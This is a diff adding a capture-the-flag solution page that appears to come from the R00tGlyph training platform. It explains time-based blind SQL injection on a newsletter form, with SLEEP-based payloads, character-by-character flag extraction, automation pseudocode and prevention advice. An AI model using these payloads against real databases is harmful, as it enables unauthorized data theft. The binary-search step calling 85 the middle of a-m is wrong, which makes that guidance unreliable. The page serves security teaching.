@@ -1,0 +1,156 @@
+{% extends 'base.html' %}
+
+{% block title %}SQL Injection Level 5 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SQL Injection Level 5 Solution: Time-Based Blind SQL Injection</h2>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
+                    <p>
+                        This challenge demonstrates a time-based blind SQL injection vulnerability in a newsletter subscription form. The application directly concatenates user input into SQL queries without proper sanitization, but doesn't display the query results directly - it only processes the subscription. However, we can use time delays to extract information from the database.
+                    </p>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-bug-fill me-2"></i>Vulnerability Explanation</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>
+                            The vulnerability exists because the application constructs an SQL query by directly concatenating user input:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>INSERT INTO subscribers (email) VALUES ('[user_input]')</code></pre>
+                        <p>
+                            This allows an attacker to manipulate the query's structure by injecting SQL code. In time-based blind SQL injection, we use SQL functions that cause delays (like SLEEP, pg_sleep, or similar) to extract information from the database.
+                        </p>
+                        <p>
+                            The key idea is to create conditional statements that only cause a delay when certain conditions are true. By measuring the response time, we can determine whether the condition was true or false, and use this to extract data bit by bit.
+                        </p>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-code-slash me-2"></i>Solution</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To exploit this vulnerability, we need to:</p>
+                        
+                        <h6>1. Verify the vulnerability exists</h6>
+                        <p>
+                            First, we need to confirm that we can cause a time delay:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>test@example.com'; SLEEP(5); --</code>
+                        </div>
+                        <p>
+                            If the response takes about 5 seconds, then we've confirmed the vulnerability.
+                        </p>
+                        
+                        <h6>2. Check if the config table exists</h6>
+                        <p>
+                            Next, we need to check if the config table exists:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>test@example.com'; IF (SELECT COUNT(*) FROM information_schema.tables WHERE table_name = 'config') SLEEP(5); --</code>
+                        </div>
+                        <p>
+                            If the response takes about 5 seconds, then the config table exists.
+                        </p>
+                        
+                        <h6>3. Check if the secret_flag key exists</h6>
+                        <p>
+                            Now, we need to check if the secret_flag key exists in the config table:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>test@example.com'; IF (SELECT COUNT(*) FROM config WHERE key_name = 'secret_flag') SLEEP(5); --</code>
+                        </div>
+                        <p>
+                            If the response takes about 5 seconds, then the secret_flag key exists.
+                        </p>
+                        
+                        <h6>4. Extract the flag character by character</h6>
+                        <p>
+                            Now we can extract the flag character by character:
+                        </p>
+                        <div class="alert alert-secondary">
+                            <code>test@example.com'; IF (ASCII(SUBSTRING((SELECT value FROM config WHERE key_name = 'secret_flag'), 1, 1)) > 97) SLEEP(5); --</code>
+                        </div>
+                        <p>
+                            This query checks if the ASCII value of the first character of the flag is greater than 97 (the ASCII value for 'a'). By using binary search (trying different values), we can determine the exact ASCII value of each character.
+                        </p>
+                        <p>
+                            For example, to find the first character:
+                        </p>
+                        <ol>
+                            <li>Try ASCII value > 97 (middle of a-z range)</li>
+                            <li>If the response is delayed, try ASCII value > 110 (middle of n-z range)</li>
+                            <li>If the response is not delayed, try ASCII value > 85 (middle of a-m range)</li>
+                            <li>Continue narrowing down until you find the exact ASCII value</li>
+                            <li>Convert the ASCII value to a character</li>
+                        </ol>
+                        <p>
+                            Repeat this process for each character position until you've extracted the entire flag.
+                        </p>
+                        
+                        <h6>5. Automating the process</h6>
+                        <p>
+                            In a real-world scenario, you would use a script to automate this process. Here's a pseudocode example:
+                        </p>
+                        <pre class="bg-light p-3 rounded"><code>flag = ""
+for position in range(1, 50):  # Assume flag length <= 50
+    for ascii_value in range(32, 127):  # Printable ASCII characters
+        query = f"test@example.com'; IF (ASCII(SUBSTRING((SELECT value FROM config WHERE key_name = 'secret_flag'), {position}, 1)) = {ascii_value}) SLEEP(5); --"
+        start_time = time.time()
+        send_request(query)
+        end_time = time.time()
+        
+        if end_time - start_time >= 5:  # If response was delayed
+            flag += chr(ascii_value)
+            break
+    
+    if len(flag) < position:  # No character found, end of flag
+        break
+
+print("Flag:", flag)</code></pre>
+                    </div>
+                </div>
+                
+                <div class="card mb-4">
+                    <div class="card-header">
+                        <h5><i class="bi bi-shield-fill-check me-2"></i>Prevention</h5>
+                    </div>
+                    <div class="card-body">
+                        <p>To prevent time-based blind SQL injection vulnerabilities, developers should:</p>
+                        <ol>
+                            <li>
+                                <strong>Use Parameterized Queries:</strong> Instead of concatenating strings, use prepared statements with parameter binding.
+                                <pre class="bg-light p-3 rounded"><code>cursor.execute("INSERT INTO subscribers (email) VALUES (?)", (email,))</code></pre>
+                            </li>
+                            <li>
+                                <strong>Use an ORM (Object-Relational Mapping):</strong> ORMs like SQLAlchemy handle parameter sanitization automatically.
+                            </li>
+                            <li>
+                                <strong>Input Validation:</strong> Validate and sanitize all user inputs before using them in queries.
+                            </li>
+                            <li>
+                                <strong>Set Query Timeouts:</strong> Configure database query timeouts to limit the effectiveness of time-based attacks.
+                            </li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level5') }}" class="btn btn-primary"><i class="bi bi-arrow-left me-2"></i>Back to Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
